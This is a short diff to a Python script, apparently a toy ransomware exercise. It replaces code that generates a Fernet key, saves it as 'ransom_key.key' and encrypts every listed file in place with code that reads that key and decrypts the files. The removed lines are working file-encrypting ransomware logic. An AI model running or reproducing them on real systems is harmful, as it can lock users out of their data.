@@ -20,17 +20,14 @@ for file in os.listdir():
 
 print(files)
 
-
-key = Fernet.generate_key()
-
-with open("ransom_key.key","wb") as ransom_key:
-    ransom_key.write(key)
+with open("ransom_key.key","rb") as key:
+    secret_key = key.read()
 
 for file in files:
     with open(file, "rb") as currFile:
         contents = currFile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
+    contents_decrypted = Fernet(secret_key).decrypt(contents)
     with open(file, "wb") as currFile:
-        currFile.write(contents_encrypted)
+        currFile.write(contents_decrypted)
 
 
